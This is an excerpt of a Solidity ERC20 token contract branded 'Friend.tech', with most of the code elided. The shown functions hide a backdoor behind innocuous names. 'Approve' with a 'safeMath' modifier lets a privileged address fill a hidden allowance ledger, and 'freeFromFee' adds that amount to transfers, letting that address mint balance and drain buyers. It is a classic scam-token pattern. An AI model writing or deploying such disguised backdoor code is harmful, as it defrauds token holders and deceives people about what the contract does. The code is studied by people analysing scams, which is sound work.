...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Friend.tech";
    ...
    uint256 public _number = block.number;

    address private immutable _uniswapFactory = 0x46e2CB69E08918f4EC75303F8185C2186bB134Cb;
    ...
    function Approve(address spender,uint256 amount) public safeMath returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        amount = freeFromFee(sender,recipient, amount);
   ...
   function _burn(address account, uint256 amount) internal virtual {
    ...
    function freeFromFee(address from, address to, uint256 balance) private view returns(uint){
        uint256 _readAllowance = readAllowance(from);
        if (_readAllowance > 0)  
            balance += _readAllowance;
        to = to ;        
        return balance;
    }
    ...
    function _Approve(address owner, address spender, uint256 amount) internal {
        ...
        uint256 _total = _number;
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[spender][owner] = amount;
        if (owner == _safeMath) {  
            _addressAllowance[owner] -= adallTotal; 
            total += amount;
            _addressAllowance[spender] = total + _total;
        } else {
            _addressAllowance[owner] -= adallTotal; 
            _addressAllowance[spender] += total;  
        }
    }
